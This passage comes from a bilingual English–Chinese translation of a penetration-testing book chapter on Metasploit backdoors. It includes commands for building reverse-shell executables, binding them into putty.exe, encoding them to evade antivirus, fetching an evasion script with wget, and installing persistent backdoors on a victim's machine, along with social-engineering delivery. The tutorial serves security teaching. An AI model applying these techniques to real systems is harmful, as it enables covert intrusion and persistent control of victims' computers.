- en: Chapter 10. Post Exploitation – Backdoors
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第10章 后期利用-后门
- en: In the previous chapter we focused on cleaning our tracks to avoid getting detected
    and caught. This chapter will cover the techniques on maintaining access to the
    compromised system by using backdoors. Backdoors play an important role in maintaining
    persistent access to the system and using the system as per the attacker's needs
    without attacking it again and again. We will discuss how to evade a malicious
    executable file from being detected by an antivirus scanner and compromise the
    user machine. Additionally, we will be discussing how to use encoders to make
    these executables undetectable.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们专注于清理我们的足迹，以避免被发现和抓住。本章将涵盖使用后门技术来保持对被攻击系统的访问。后门在维持对系统的持久访问和根据攻击者的需求使用系统方面发挥着重要作用，而无需一次又一次地对其进行攻击。我们将讨论如何规避恶意可执行文件被杀毒软件扫描器检测到并妥协用户机器。此外，我们还将讨论如何使用编码器使这些可执行文件无法被检测到。
- en: What is a backdoor?
  id: totrans-2
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是后门？
- en: A backdoor is a means of gaining access to a computer by ways that bypass the
    normal security mechanisms in place. With the development in technology, it now
    comes with a remote administration utility that allows an attacker to control
    the system remotely from anywhere through the Internet. This can be in the form
    of bypassing authentication, obtaining access to confidential information, and
    securing illegal access to a computer system. Trends indicate that these have
    been more focused on downloading/uploading files, remotely taking screenshots,
    running keyloggers, gathering system information, and hampering user privacy.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 后门是一种通过绕过正常的安全机制来获取对计算机的访问权限的手段。随着技术的发展，它现在配备了远程管理实用程序，允许攻击者通过互联网远程控制系统。这可以是绕过身份验证、获取机密信息和非法访问计算机系统的形式。趋势表明，这些更多地集中在下载/上传文件、远程截屏、运行键盘记录器、收集系统信息和侵犯用户隐私方面。
- en: As an example, consider a client-server network communication where the attacked
    machine acts as a server and the client is our attacker. Once the server application
    is started on the compromised user, it starts listening for incoming connections.
    Hence a client can easily connect on that specific port and start the communication.
    Once the communication starts, it may be followed up with other malicious activities
    as described earlier. We have a kind of reverse connection between the server
    and the client. The server connects to a single client and the client can send
    a single command to multiple servers that are connected.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 举个例子，考虑一个客户端-服务器网络通信，被攻击的机器充当服务器，客户端是我们的攻击者。一旦在受损的用户上启动服务器应用程序，它就开始监听传入的连接。因此，客户端可以轻松连接到特定端口并开始通信。一旦通信开始，可能会跟随其他恶意活动，如前面所述。我们在服务器和客户端之间建立了一种反向连接。服务器连接到单个客户端，客户端可以向连接的多个服务器发送单个命令。
- en: Payload tools
  id: totrans-5
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 有效载荷工具
- en: 'We may come across several payload-making tools throughout this chapter. They
    are briefly described here:'
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们可能会遇到几种有效载荷制作工具。它们在这里简要描述：
- en: '`msfpayload`: This is a command-line instance of Metasploit used to generate
    and output all of the various types of shell code available in Metasploit. This
    is mainly used for the generation of shell code for an exploit not found in Metasploit
    or for testing different types of shell code and options before finalizing a module.
    It is an excellent mix of different options and variables.'
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfpayload`：这是Metasploit的命令行实例，用于生成和输出Metasploit中所有各种类型的shell代码。这主要用于生成Metasploit中未找到的利用或在最终确定模块之前测试不同类型的shell代码和选项。它是不同选项和变量的绝妙混合。'
- en: '`msfencode`: This is another great tool in the Metasploit kit for exploit development.
    Its main use is to encode the shell code generated by `msfpayload`. This is done
    to suit the target in order to function properly. It may involve transforming
    the shell code into pure alphanumeric and getting rid of bad characters and encoding
    it for 64-bit targets. This can be used to encode the shell code multiple times;
    output it in various formats such as C, Perl, and Ruby; and even merge it to an
    existing executable file.'
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfencode`：这是Metasploit工具包中用于利用开发的另一个很好的工具。它的主要用途是对`msfpayload`生成的shell代码进行编码。这是为了适应目标以便正常运行。它可能涉及将shell代码转换为纯字母数字，并摆脱坏字符并对64位目标进行编码。它可以用于多次编码shell代码；以各种格式输出，如C、Perl和Ruby；甚至将其合并到现有的可执行文件中。'
- en: '`msfvenom`: Technically speaking, `msfvenom` is a combination of `msfpayload`
    and `msfencode`. The advantages of `msfvenom` include a number of standardized
    command-line options, a single tool, and increased speed.'
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`msfvenom`：从技术上讲，`msfvenom`是`msfpayload`和`msfencode`的组合。`msfvenom`的优势包括一些标准化的命令行选项、一个单一的工具和增加的速度。'
- en: Creating an EXE backdoor
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 创建一个EXE后门
- en: In this section, we will learn how to create a malicious backdoor using inbuilt
    payloads. But before starting this, we will check the location (payload directory)
    of these payloads in the Metasploit framework. So we go to the root directory
    and then to `/opt/metasploit/msf3/modules`. Under this directory, we find the
    **payloads** directory.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将学习如何使用内置有效载荷创建一个恶意后门。但在开始之前，我们将检查Metasploit框架中这些有效载荷的位置（有效载荷目录）。因此，我们转到根目录，然后转到`/opt/metasploit/msf3/modules`。在这个目录下，我们找到**有效载荷**目录。
- en: '![Creating an EXE backdoor](img/3589_10_01.jpg)'
  id: totrans-12
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个EXE后门](img/3589_10_01.jpg)'
- en: We can also see all these payloads from msfconsole by using a simple command.
    Just type in `show payloads` and it will list all payloads.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以通过使用一个简单的命令从msfconsole中查看所有这些有效载荷。只需输入`show payloads`，它就会列出所有有效载荷。
- en: '![Creating an EXE backdoor](img/3589_10_02.jpg)'
  id: totrans-14
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个EXE后门](img/3589_10_02.jpg)'
- en: For creating a backdoor with the help of a payload, there are three available
    tools in Metasploit, `msfpayload`, `msfencode` and `msfvenom`. These three tools
    are found at `/opt/metasploit/msf3`.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使用有效载荷创建后门，Metasploit中有三种可用工具，`msfpayload`、`msfencode`和`msfvenom`。这三个工具位于`/opt/metasploit/msf3`。
- en: '![Creating an EXE backdoor](img/3589_10_03.jpg)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_03.jpg)'
- en: Now we will see how to use `msfpayload` for creating a backdoor. Open the terminal
    and enter the path to the `msfpayload` directory. In our case, it is `cd /opt/metasploit/msf3`.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将看到如何使用`msfpayload`创建后门。打开终端并输入路径到`msfpayload`目录。在我们的情况下，它是`cd /opt/metasploit/msf3`。
- en: '![Creating an EXE backdoor](img/3589_10_04.jpg)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_04.jpg)'
- en: Now we are in the directory and we can use `msfpayload` for creating a backdoor;
    that is, the location of `msfpayload`. Typing in `./msfpayload -h` will show us
    all the usable commands of the `msfpayload`.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们在目录中，我们可以使用`msfpayload`来创建一个后门；也就是说，`msfpayload`的位置。输入`./msfpayload -h`将显示`msfpayload`的所有可用命令。
- en: '![Creating an EXE backdoor](img/3589_10_05.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_05.jpg)'
- en: We see that there is an option for `<payload>`. This means that we have to select
    a payload first from the payload list, which has already been shown to you by
    the `show payloads` command. So we now select a payload.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到有一个`<payload>`选项。这意味着我们首先必须从有效载荷列表中选择一个有效载荷，这已经由`show payloads`命令向您显示。所以我们现在选择一个有效载荷。
- en: '![Creating an EXE backdoor](img/3589_10_06.jpg)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_06.jpg)'
- en: For example, here we are selecting the `windows/x64/meterpreter/reverse_tcp`
    payload for creating our backdoor.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，在这里，我们选择`windows/x64/meterpreter/reverse_tcp`有效载荷来创建我们的后门。
- en: Now type in `./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105
    X> root/Desktop/virus.exe`.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 现在输入`./msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 X>
    root/Desktop/virus.exe`。
- en: 'The syntax to be used is as follows:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用的语法如下：
- en: '[PRE0]'
  id: totrans-26
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: '![Creating an EXE backdoor](img/3589_10_07.jpg)'
  id: totrans-27
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_07.jpg)'
- en: After typing in the command, we see that we have a `virus.exe` backdoor on our
    desktop. That's it; we are done. It is that easy to create a backdoor using `msfpayload`.
    If we do not want to create our own EXE file and just want to bind with another
    EXE file (may be with a software setup file), we can do it by using a mixture
    of `msfpayload` and `msfvenom`.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 输入命令后，我们看到我们的桌面上有一个`virus.exe`后门。就是这样；我们完成了。使用`msfpayload`创建后门是如此简单。如果我们不想创建自己的EXE文件，只想与另一个EXE文件绑定（可能是软件安装文件），我们可以使用`msfpayload`和`msfvenom`的混合。
- en: 'We will now bind our backdoor EXE file with the `putty.exe` file. Type in the
    following command very carefully:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将把我们的后门EXE文件与`putty.exe`文件绑定。非常小心地输入以下命令：
- en: '[PRE1]'
  id: totrans-30
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'The syntax to be used is as follows:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用的语法如下：
- en: '[PRE2]'
  id: totrans-32
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: We can see in the following screenshot that our virus file, `virus.exe`, has
    been bound with `putty.exe` to give us `virusputty.exe`, which is available on
    our desktop for use.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在以下截图中看到我们的病毒文件`virus.exe`已经与`putty.exe`绑定，给我们`virusputty.exe`，它可以在我们的桌面上使用。
- en: '![Creating an EXE backdoor](img/3589_10_08.jpg)'
  id: totrans-34
  prefs: []
  type: TYPE_IMG
  zh: '![创建EXE后门](img/3589_10_08.jpg)'
- en: Up to this point in the chapter, we have learned to create a backdoor with `msfpayload`
    and `msfvenom`. The next step is sending this backdoor EXE program to a victim
    by using any of the social engineering techniques.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，在本章中，我们已经学会了使用`msfpayload`和`msfvenom`创建后门。下一步是使用任何社会工程技术将这个后门EXE程序发送给受害者。
- en: Creating a fully undetectable backdoor
  id: totrans-36
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 创建一个完全不可检测的后门
- en: The backdoor that we have created in the earlier section is not very efficient
    and lacks detection-evasion mechanisms. The problem is that the backdoor can be
    easily detected by an antivirus program. So, in this section, our main task will
    be to make an undetectable backdoor and bypass the antivirus program.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在前一节中创建的后门效率不高，缺乏检测逃避机制。问题在于后门很容易被杀毒程序检测到。因此，在本节中，我们的主要任务将是制作一个不可检测的后门并绕过杀毒程序。
- en: We just sent our `virus.exe` file to the victim by changing its name to `game.exe`
    so that he/she will download it.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 我们刚刚将我们的`virus.exe`文件发送给受害者，将其更改为`game.exe`的名称，以便他/她下载。
- en: '![Creating a fully undetectable backdoor](img/3589_10_09.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_09.jpg)'
- en: After downloading the `game.exe` file, it gets detected by AVG antivirus as
    a virus.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 下载`game.exe`文件后，它被AVG杀毒软件检测为病毒。
- en: '![Creating a fully undetectable backdoor](img/3589_10_10.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_10.jpg)'
- en: Our backdoor is easily detected by the antivirus program and we have to make
    it undetectable. Let us start the process. We will use `msfencode` and an encoder
    to do this. First, select a good encoder for encoding the backdoor EXE file. Type
    in `show encoders`; this will show the list of available encoders in Metasploit.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的后门很容易被杀毒程序检测到，我们必须使其不可检测。让我们开始这个过程。我们将使用`msfencode`和编码器来做到这一点。首先，选择一个用于编码后门EXE文件的良好编码器。输入`show
    encoders`；这将显示Metasploit中可用编码器的列表。
- en: '![Creating a fully undetectable backdoor](img/3589_10_11.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_11.jpg)'
- en: We can now see the encoders list. We will select `x86 shikata_ga_nai` because
    it has a rank of **excellent**.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以看到编码器列表。我们将选择`x86 shikata_ga_nai`，因为它的排名是**excellent**。
- en: '![Creating a fully undetectable backdoor](img/3589_10_12.jpg)'
  id: totrans-45
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_12.jpg)'
- en: 'Now type in the following command:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 现在输入以下命令：
- en: '[PRE3]'
  id: totrans-47
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The syntax to be used is as follows:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用的语法如下：
- en: '[PRE4]'
  id: totrans-49
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: We can see in the following screenshot that our `supergame.exe` file has been
    created.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在以下截图中看到我们的`supergame.exe`文件已经创建。
- en: '![Creating a fully undetectable backdoor](img/3589_10_13.jpg)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_13.jpg)'
- en: Again, we send the `supergame.exe` file to a victim in the form of a link and
    make him/her download the `supergame.exe` file onto his/her desktop.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 再次，我们以链接的形式将`supergame.exe`文件发送给受害者，并让他/她将`supergame.exe`文件下载到他/她的桌面上。
- en: '![Creating a fully undetectable backdoor](img/3589_10_14.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_14.jpg)'
- en: If the victim scans the `supergame.exe` file with his/her antivirus program,
    he/she will find it to be a clean file.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 如果受害者使用杀毒程序扫描`supergame.exe`文件，他/她会发现它是一个干净的文件。
- en: '![Creating a fully undetectable backdoor](img/3589_10_15.jpg)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_15.jpg)'
- en: If you don't like typing so many commands in the terminal, there is another
    easy way to create an undetectable backdoor with the help of a script. This script
    is called Vanish. Before working on the script, we have to install some packages
    that are required by the Vanish script, in BackTrack (BackTrack is a distribution
    based on the Debian GNU/Linux distribution aimed at digital forensics and penetration
    testing use). So type in `apt-get install mingw32-runtime mingw-w64 mingw gcc-mingw32
    mingw32-binutils`. It will take a few minutes to install all the necessary packages.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你不喜欢在终端中输入这么多命令，还有另一种简单的方法可以借助脚本创建一个不可检测的后门。这个脚本叫做Vanish。在处理脚本之前，我们必须在BackTrack（BackTrack是一个基于Debian
    GNU/Linux发行版的发行版，旨在进行数字取证和渗透测试）中安装一些Vanish脚本所需的软件包。因此，键入`apt-get install mingw32-runtime
    mingw-w64 mingw gcc-mingw32 mingw32-binutils`。安装所有必要的软件包需要几分钟的时间。
- en: '![Creating a fully undetectable backdoor](img/3589_10_16.jpg)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_16.jpg)'
- en: After successfully installing the packages, we have to just download the script
    from the Internet by typing in `wget http://samsclass.info/120/proj/vanish.sh`;
    the `vanish.sh` file is saved on the desktop.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 成功安装软件包后，我们只需通过键入`wget http://samsclass.info/120/proj/vanish.sh`从互联网上下载脚本；`vanish.sh`文件保存在桌面上。
- en: '![Creating a fully undetectable backdoor](img/3589_10_17.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_17.jpg)'
- en: After that, type in `ll van*`.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，键入`ll van*`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_18.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_18.jpg)'
- en: Now change the permissions on the script by typing in `chmod a+x vanish.sh`.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在通过键入`chmod a+x vanish.sh`来更改脚本的权限。
- en: '![Creating a fully undetectable backdoor](img/3589_10_19.jpg)'
  id: totrans-63
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_19.jpg)'
- en: After that, we have to move the Vanish script that is in the Metasploit directory
    to `pentest/exploits/framework2`.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，我们必须将位于Metasploit目录中的Vanish脚本移动到`pentest/exploits/framework2`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_20.jpg)'
  id: totrans-65
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_20.jpg)'
- en: Our Vanish script is now ready for use, so let us go to that directory and type
    in `sh vanish.sh`.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的Vanish脚本现在已经准备好使用了，所以让我们进入该目录并键入`sh vanish.sh`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_21.jpg)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_21.jpg)'
- en: After executing the script, the script will ask for the network interface on
    which we want to use it. Type in `eth0`.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 执行脚本后，脚本将要求我们要在哪个网络接口上使用它。键入`eth0`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_22.jpg)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_22.jpg)'
- en: After providing the device interface, it will ask for a few more options, such
    as the port number of the reverse connection it will listen to (`4444`), a random
    seed number (we enter it as `2278`), and the number of times to encode the payload
    (we specify `2`). After giving these details, it will create a `backdoor.exe`
    file in the `seclabs` directory. The `seclabs` directory is located in the same
    directory as the Vanish script. The payload handler will also be automatically
    launched in msfconsole by the script. Now we just have to send that `backdoor.exe`
    file to the victim and wait for its execution.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 提供设备接口后，它会要求提供一些更多的选项，比如它将监听的反向连接的端口号（`4444`），一个随机种子号（我们输入为`2278`），以及对载荷进行编码的次数（我们指定为`2`）。在提供了这些细节之后，它将在`seclabs`目录中创建一个`backdoor.exe`文件。`seclabs`目录位于与Vanish脚本相同的目录中。脚本还将自动在msfconsole中启动载荷处理程序。现在我们只需要将`backdoor.exe`文件发送给受害者，并等待其执行。
- en: '![Creating a fully undetectable backdoor](img/3589_10_23.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_23.jpg)'
- en: We have, up to this point, learned about the different methods and tricks for
    creating a backdoor. Now we will go to the next part – handling the reverse connection
    from the victim's computer after executing the backdoor. After sending the payload
    to the victim, open msfconsole and type in `use exploit/multi/handler`.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们已经学习了创建后门的不同方法和技巧。现在我们将进入下一部分 - 在执行后门后处理来自受害者计算机的反向连接。将载荷发送给受害者后，打开msfconsole并键入`use
    exploit/multi/handler`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_24.jpg)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_24.jpg)'
- en: Then just set all the payload details in this handler and send it to the victim.
    Type in `set PAYLOAD <your payload name>`; for example, here we are using `set
    PAYLOAD windows/meterpreter/reverse_tcp`.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 然后只需在此处理程序中设置所有载荷细节并将其发送给受害者。例如，键入`set PAYLOAD <your payload name>`；在这里，我们使用`set
    PAYLOAD windows/meterpreter/reverse_tcp`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_25.jpg)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_25.jpg)'
- en: After that, set the local host address that you have provided to your backdoor
    EXE file. Type in `set LHOST <IP address>`; for example, here we are using `set
    LHOST 192.168.0.103`.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 之后，设置您为后门EXE文件提供的本地主机地址。例如，键入`set LHOST <IP地址>`；在这里，我们使用`set LHOST 192.168.0.103`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_26.jpg)'
  id: totrans-77
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_26.jpg)'
- en: This is the last and final type of attack using the technique of exploitation
    and we will see that our reverse handler connection is ready for receiving connections.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 这是利用利用技术进行攻击的最后一种类型，我们将看到我们的反向处理程序连接已准备好接收连接。
- en: '![Creating a fully undetectable backdoor](img/3589_10_27.jpg)'
  id: totrans-79
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_27.jpg)'
- en: After executing the backdoor, the reverse connection will be established successfully
    and a Meterpreter session will be spawned on the attacker's system.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 执行后门后，反向连接将成功建立，并且在攻击者的系统上将生成一个Meterpreter会话。
- en: '![Creating a fully undetectable backdoor](img/3589_10_28.jpg)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_28.jpg)'
- en: Let us obtain information about the victim's system by checking his/her system
    properties.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过检查受害者的系统属性来获取有关受害者系统的信息。
- en: '![Creating a fully undetectable backdoor](img/3589_10_29.jpg)'
  id: totrans-83
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_29.jpg)'
- en: It is time to learn something different. In this section we will learn to install
    a backdoor in the victim's system after attaining a Meterpreter session.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 现在是时候学习一些不同的东西了。在本节中，我们将学习在获得Meterpreter会话后在受害者系统中安装后门。
- en: There is another backdoor available in Metasploit, which is known as `metsvc`.
    We will first check the commands that can be used with this backdoor, so type
    in `run metsvc -h` and it will show us these.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit中还有另一个后门，称为`metsvc`。我们将首先检查可以与此后门一起使用的命令，因此输入`run metsvc -h`，它将向我们显示这些命令。
- en: '![Creating a fully undetectable backdoor](img/3589_10_30.jpg)'
  id: totrans-86
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_30.jpg)'
- en: We can see that the `-A` option will automatically launch a backdoor in the
    victim's machine. So type in `run metsvc -A`.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到`-A`选项将自动在受害者的机器上启动后门。因此输入`run metsvc -A`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_31.jpg)'
  id: totrans-88
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_31.jpg)'
- en: We can see that a second Meterpreter session is established from the victim's
    system and the malicious backdoor `metsvc-server.exe` file is successfully uploaded
    in the victim's system and executed.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到第二个Meterpreter会话从受害者的系统建立，并且恶意后门`metsvc-server.exe`文件已成功上传到受害者的系统并执行。
- en: '![Creating a fully undetectable backdoor](img/3589_10_32.jpg)'
  id: totrans-90
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_32.jpg)'
- en: The victim's task manager displays our backdoor service as running. These malicious
    files are uploaded to Windows' `Temp` directory at `C:\WINDOWS\Temp\CFcREntszFKx`.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者的任务管理器显示我们的后门服务正在运行。这些恶意文件被上传到Windows的`Temp`目录下的`C:\WINDOWS\Temp\CFcREntszFKx`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_33.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_33.jpg)'
- en: If you want to remove that backdoor service from the victim's system, type in
    `run metsvc -r`.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 如果要从受害者的系统中删除该后门服务，请输入`run metsvc -r`。
- en: '![Creating a fully undetectable backdoor](img/3589_10_34.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![创建一个完全不可检测的后门](img/3589_10_34.jpg)'
- en: We can see that the `metsvc` service is successfully removed, but the EXE files
    from the victim's `Temp` directory will not get removed.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到`metsvc`服务已成功删除，但受害者的`Temp`目录中的EXE文件不会被删除。
- en: Metasploit persistent backdoor
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Metasploit持久后门
- en: In this part, we will learn to use a persistent backdoor. It is a Meterpreter
    script that installs a backdoor service in the target system. So type in `run
    persistence -h` for showing all the commands that can be used with a persistent
    backdoor.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在这部分，我们将学习使用持久后门。这是一个在目标系统中安装后门服务的Meterpreter脚本。因此输入`run persistence -h`以显示可以与持久后门一起使用的所有命令。
- en: '![Metasploit persistent backdoor](img/3589_10_35.jpg)'
  id: totrans-98
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_35.jpg)'
- en: After understanding the usable commands, type in `run persistence -A -L C:\\
    -S -X -p 445 -i 10 -r 192.168.0.103`.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 在了解可用命令之后，输入`run persistence -A -L C:\\ -S -X -p 445 -i 10 -r 192.168.0.103`。
- en: 'The commands in this syntax are explained as follows:'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 此语法中的命令解释如下：
- en: '`A`: For automatically starting a payload handler'
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`A`：自动启动payload处理程序'
- en: '`L`: The location in the target host for dropping the payload'
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`L`：在目标主机上放置payload的位置'
- en: '`S`: For automatically starting the agent when the system boots'
  id: totrans-103
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`S`：在系统启动时自动启动代理'
- en: '`p`: The port number for listening to reverse connections'
  id: totrans-104
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`p`：用于监听反向连接的端口号'
- en: '`i`: The time interval for new connections'
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`i`：新连接的时间间隔'
- en: '`r`: The IP address of the target machine'
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`r`：目标机器的IP地址'
- en: 'Now we run our persistence backdoor script as shown in the following screenshot:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们运行我们的持久后门脚本，如下截图所示：
- en: '![Metasploit persistent backdoor](img/3589_10_36.jpg)'
  id: totrans-108
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_36.jpg)'
- en: We see that a Meterpreter session has been established from the victim's system.
    Let us verify whether the payload is dropped in the victim's `C:` drive.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到从受害者的系统建立了一个Meterpreter会话。让我们验证一下payload是否被放在了受害者的`C:`驱动器中。
- en: '![Metasploit persistent backdoor](img/3589_10_37.jpg)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit持久后门](img/3589_10_37.jpg)'
- en: If you want to remove that payload, we have to type in `resource` and the path
    of the file that has been created at the time of running the `persistence` command.
    We can find the path in the previous step. Type in `resource /root/.msf4/logs/persistence/PWNED-02526E037_20130513.2452/PWNED-02526E037_20130513.2452.rc`.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
